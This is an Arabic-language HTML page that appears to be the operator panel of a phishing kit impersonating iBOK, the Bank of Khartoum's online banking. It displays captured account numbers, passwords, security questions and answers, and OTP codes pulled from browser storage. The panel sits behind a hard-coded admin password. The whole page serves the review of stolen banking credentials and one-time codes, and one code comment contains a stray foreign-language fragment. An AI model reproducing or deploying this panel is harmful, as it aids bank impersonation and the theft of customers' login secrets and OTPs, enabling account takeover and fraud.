<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>iBOK - لوحة التحكم</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 30px 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .admin-container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            overflow: hidden;
        }
        .admin-header {
            background: linear-gradient(135deg, #c1121f, #e63946);
            padding: 24px 20px;
            color: white;
            text-align: center;
        }
        .admin-header h1 {
            font-size: 28px;
            font-weight: 800;
        }
        .admin-header h1 i {
            margin-left: 8px;
        }
        .admin-body {
            padding: 24px;
        }
        .admin-body .welcome {
            font-size: 18px;
            font-weight: 700;
            color: #c1121f;
            margin-bottom: 20px;
            text-align: center;
            border-bottom: 2px solid #e63946;
            padding-bottom: 12px;
        }
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 24px;
        }
        .data-table th,
        .data-table td {
            padding: 12px 10px;
            border-bottom: 1px solid #eee;
            text-align: right;
        }
        .data-table th {
            background: #f8f9fa;
            color: #c1121f;
            font-weight: 700;
            width: 40%;
        }
        .data-table td {
            font-weight: 500;
            color: #333;
        }
        .admin-actions {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 12px;
        }
        .admin-actions button {
            padding: 12px 28px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Cairo', sans-serif;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn-logout {
            background: #e63946;
            color: white;
        }
        .btn-logout:hover {
            background: #c1121f;
        }
        .btn-back {
            background: #f0f0f0;
            color: #555;
        }
        .btn-back:hover {
            background: #e0e0e0;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #888;
        }
        .empty-state i {
            font-size: 48px;
            color: #ddd;
            margin-bottom: 16px;
        }
        .footer-note {
            text-align: center;
            font-size: 13px;
            color: #aaa;
            margin-top: 20px;
            border-top: 1px solid #eee;
            padding-top: 16px;
        }
        @media (max-width: 480px) {
            .admin-header h1 { font-size: 24px; }
            .data-table th, .data-table td { font-size: 14px; padding: 10px 6px; }
            .admin-actions button { font-size: 14px; padding: 10px 20px; }
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="admin-header">
            <h1><i class="fas fa-user-cog"></i> لوحة تحكم الإدارة</h1>
        </div>
        <div class="admin-body">
            <div class="welcome"><i class="fas fa-database"></i> البيانات المدخلة</div>

            <!-- سيتم ملء البيانات بواسطة JavaScript -->
            <div id="dataContainer">
                <table class="data-table">
                    <tr><th>رقم الحساب</th><td id="adminAccount">-</td></tr>
                    <tr><th>كلمة المرور</th><td id="adminPassword">-</td></tr>
                    <tr><th>سؤال الأمان</th><td id="adminQuestion">-</td></tr>
                    <tr><th>إجابة الأمان</th><td id="adminAnswer">-</td></tr>
                    <tr><th>رمز OTP المدخل</th><td id="adminOtp">-</td></tr>
                </table>
            </div>

            <div class="admin-actions">
                <button class="btn-logout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</button>
                <button class="btn-back" onclick="goBack()"><i class="fas fa-arrow-right"></i> العودة</button>
            </div>
            <div class="footer-note">© 2025 iBOK | بنك الخرطوم</div>
        </div>
    </div>

    <script>
        // ============================================================
        // 🔐 حماية صفحة الإدارة بكلمة مرور
        // ============================================================
        (function adminAuth() {
            // كلمة المرور المطلوبة للدخول (غير قابلة للتغيير من هنا)
            const ADMIN_PASSWORD = 'snox_admin_2025';

            // التحقق من وجود جلسة مصادقة مسبقة (لتجنب طلب كلمة المرور كل مرة)
            const sessionValid = sessionStorage.getItem('admin_authenticated');

            if (!sessionValid || sessionValid !== 'true') {
                // طلب كلمة المرور من المستخدم
                const userPass = prompt('🔐 أدخل كلمة مرور المدير للوصول إلى لوحة التحكم:');

                if (userPass === null) {
                    // المستخدم ضغط على "إلغاء" → نعيده للصفحة الرئيسية
                    window.location.href = 'index.html';
                    return;
                }

                if (userPass !== ADMIN_PASSWORD) {
                    alert('❌ كلمة مرور غير صحيحة! سيتم إعادة توجيهك إلى الصفحة الرئيسية.');
                    window.location.href = 'index.html';
                    return;
                }

                // ✅ كلمة المرور صحيحة → تخزين جلسة المصادقة
                sessionStorage.setItem('admin_authenticated', 'true');
            }

            // إذا وصلنا到这里، فهذا يعني أن المستخدم مصرح له بالدخول
            // نواصل تحميل البيانات...
        })();

        // ============================================================
        // 📊 تحميل البيانات من localStorage وعرضها
        // ============================================================
        function loadAdminData() {
            const account = localStorage.getItem('admin_account') || '-';
            const password = localStorage.getItem('admin_password') || '-';
            const question = localStorage.getItem('admin_question') || '-';
            const answer = localStorage.getItem('admin_answer') || '-';
            const otp = localStorage.getItem('admin_otp') || '-';

            document.getElementById('adminAccount').textContent = account;
            document.getElementById('adminPassword').textContent = password;
            document.getElementById('adminQuestion').textContent = question;
            document.getElementById('adminAnswer').textContent = answer;
            document.getElementById('adminOtp').textContent = otp;
        }

        // ============================================================
        // 🔄 تسجيل الخروج (مسح البيانات وإنهاء الجلسة)
        // ============================================================
        function logout() {
            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
                localStorage.clear();
                sessionStorage.removeItem('admin_authenticated');
                window.location.href = 'index.html';
            }
        }

        // ============================================================
        // ↩️ العودة إلى الصفحة الرئيسية (دون مسح البيانات)
        // ============================================================
        function goBack() {
            window.location.href = 'index.html';
        }

        // ============================================================
        // 🚀 تحميل الصفحة والتحقق من وجود بيانات
        // ============================================================
        window.onload = function() {
            const hasData = localStorage.getItem('admin_account');
            if (!hasData) {
                document.getElementById('dataContainer').innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-exclamation-circle"></i>
                        <p>لا توجد بيانات لعرضها. يرجى تسجيل الدخول أولاً.</p>
                    </div>
                `;
            } else {
                loadAdminData();
            }
        };
    </script>
</body>
</html>
